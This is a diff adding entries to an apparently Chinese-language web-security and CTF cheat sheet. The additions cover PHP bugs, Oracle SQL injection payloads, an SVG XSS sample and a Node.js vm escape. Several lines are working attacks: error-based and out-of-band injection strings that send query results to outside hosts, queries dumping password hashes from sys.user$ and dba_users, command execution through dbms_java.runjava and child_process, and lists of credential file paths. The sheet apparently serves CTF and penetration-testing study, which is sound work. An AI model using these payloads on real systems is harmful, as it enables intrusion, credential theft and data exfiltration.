@@ -814,6 +814,17 @@ echo file_get_contents('bar/etc/passwd');
     - PHP的預設Global space是`\`
     - e.g. `\system('ls');`
 
+- basename (php bug 62119)
+    - `basename("index.php/config.php/喵")`
+        - `config.php`
+    - Example: [zer0pts CTF 2020 - Can you guess it?](https://github.com/w181496/CTF/tree/master/zer0pts2020/can_you_guess_it)
+
+- strip_tags (php bug 78814)
+    - php version <= 7.4.0
+    - `<s/trong>b</strong>`
+        - `<s/trong>b</strong>`
+    - Example: [zer0pts CTF 2020 - MusicBlog](https://github.com/w181496/CTF/tree/master/zer0pts2020/MusicBlog)
+
 # Command Injection
 
 ```
@@ -1332,7 +1343,7 @@ pop graphic-context
 - `SELECT`語句必須包含`FROM`
     - 未指定來源，可以用`dual`表
 - 子字串：
-    - `SUBSTR("abc", 1, 1) => 'a'`
+    - `SUBSTR('abc', 1, 1) => 'a'`
 - 空白字元
     - `00 0A 0D 0C 09 20`
 - IF語句
@@ -1340,14 +1351,35 @@ pop graphic-context
 - 註解：
     - `--`
     - `/**/`
+- 不支援 limit
+    - 改用 rownum
+    - `select table_name from (select rownum no, table_name from all_tables) where no=1`
+- 單雙引號
+    - 單引號: string, date
+    - 雙引號: identifier (table name, column name, ...)
 - 其它
     - `SYS.DATABASE_NAME`
         - current database
     - `USER`
         - current user
+        - or `sys.login_user`
+    - `SELECT role FROM session_roles`
+        - current role
+    - `SELECT privilege FROM user_sys_privs`
+        - system privileges granted to the current user
+    - `SELECT privilege FROM role_sys_privs`
+        - privs the current role has
+    - `SELECT privilege FROM session_privs`
+        - the all privs that current user has = user_sys_privs + role_sys_privs
     - `SELECT banner FROM v$version where rownum=1`
         - database version
-- 庫名
+    - `SELECT host_name FROM v$instance;`
+        - Name of the host machine
+    - `utl_inaddr.get_host_address`
+        - 本機IP
+    - `select utl_inaddr.get_host_name('87.87.87.87') from dual`
+        - IP反解
+- 庫名(schema)
     - `SELECT DISTINCT OWNER FROM ALL_TABLES`
 - 表名
     - `SELECT OWNER, TABLE_NAME FROM ALL_TABLES`
@@ -1361,15 +1393,39 @@ pop graphic-context
     - `dbms_pipe.receive_message(('a'),10)`
         - `SELECT CASE WHEN (CONDITION_HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual`
 - Error Based
-    - `SELECT * FROM news WHERE id=1 and CTXSYS.DRITHSX.SN(user, (SELECT banner FROM v$version WHERE rownum=1))=1`
+    - `CTXSYS.DRITHSX.SN`
+        - `SELECT * FROM news WHERE id=1 and CTXSYS.DRITHSX.SN(user, (SELECT banner FROM v$version WHERE rownum=1))=1`
+    - `utl_inaddr.get_host_name`
+        - `and 1=utl_inaddr.get_host_name((SQL in HERE))`
+        - 版本>=11g，需要超級用戶或授予網路權限的用戶才能用
+    - `dbms_xdb_version.checkin`
+        - `and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null`
+    - `dbms_xdb_version.makeversioned`
+        - `and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null`
+    - `dbms_xdb_version.uncheckout`
+        - `and (select dbms_xdb_version.uncheckout((select user from dual)) from dual) is not null`
+    - `dbms_utility.sqlid_to_sqlhash`
+        - `and (SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null`
 - Out of band
     - `UTL_HTTP.request('http://kaibro.tw/'||(select user from dual))=1`
     - `SYS.DBMS_LDAP.INIT()`
     - `utl_inaddr.get_host_address()`
+    - `HTTPURITYPE`
+        - `SELECT HTTPURITYPE('http://30cm.club/index.php').GETCLOB() FROM DUAL;`
     - `extractvalue()` XXE
         - `SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT xxxx)||'.oob.kaibro.tw/"> %remote;]>'),'/l') FROM dual`
         - 新版已patch
 
+- users
+    - `select username from all_users`
+        - lists all users of the database
+    - `select name, password from sys.user$`
+    - `select username,password,account_status from dba_users`
+
+- 特殊用法
+    - `DBMS_XMLGEN.getXML('select user from dual')`
+    - `dbms_java.runjava('com/sun/tools/script/shell/Main -e "var p = java.lang.Runtime.getRuntime().exec(''$cmd'');"')`
+        - Java code execution
 ## SQLite
 
 - 子字串：
@@ -1398,6 +1454,10 @@ pop graphic-context
 - 其他
     - `sqlite_version()`
     - sqlite無法使用`\'`跳脫單引號
+    - `[]` 神奇用法
+        - `CREATE TABLE a AS SELECT sql [ some shit... ]FROM sqlite_master;`
+            - CREATE TABLE 後面也能接 SELECT condition
+        - [zer0pts CTF 2020 - phpNantokaAdmin](https://github.com/w181496/CTF/tree/master/zer0pts2020/phpNantokaAdmin)
 - Boolean Based: SECCON 2017 qual SqlSRF
 
 <details>
@@ -1659,6 +1719,7 @@ HQL injection example (pwn2win 2017)
     - `.histfile`
     - `.node_repl_history`
     - `.python_history`
+    - `.scapy_history`
     - `.sqlite_history`
     - `.psql_history`
     - `.lesshst`
@@ -1684,6 +1745,7 @@ HQL injection example (pwn2win 2017)
     - `~/.aws/config`
     - `~/.aws/credentials`
     - `~/.boto`
+    - `~/.s3cfg`
     - `~/.gitconfig`
     - `~/.config/git/config`
     - `~/.git-credentials`
@@ -2662,7 +2724,21 @@ xxe.dtd:
     - `[a](javascript:window.onerror=alert;throw%201)`
     - ...
 
-- 文件XSS
+- SVG XSS
+
+```xml
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+  <script type="text/javascript">
+    alert(document.domain);
+  </script>
+</svg>
+```
+
+- Polyglot XSS
     - Example: PlaidCTF 2018 wave XSS
     - 上傳.wave檔 (會檢查signatures)
       ```
@@ -3030,6 +3106,11 @@ state[i] = state[i-3] + state[i-31]`
     - 影響: 8.5.0版
     - `/static/../../../foo/../../../../etc/passwd`
 
+- Node.js vm escape
+    - `const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').execSync('whoami').toString()`
+    - CONFidence CTF 2020 - TempleJS
+        - Only allow ```/^[a-zA-Z0-9 ${}`]+$/g```
+        - ``` Function`a${`return constructor`}{constructor}` `${constructor}` `return flag` `` ```
 - Apache Tomcat Session操縱漏洞
     - 預設session範例頁面`/examples/servlets /servlet/SessionExample`
     - 可以直接對Session寫入
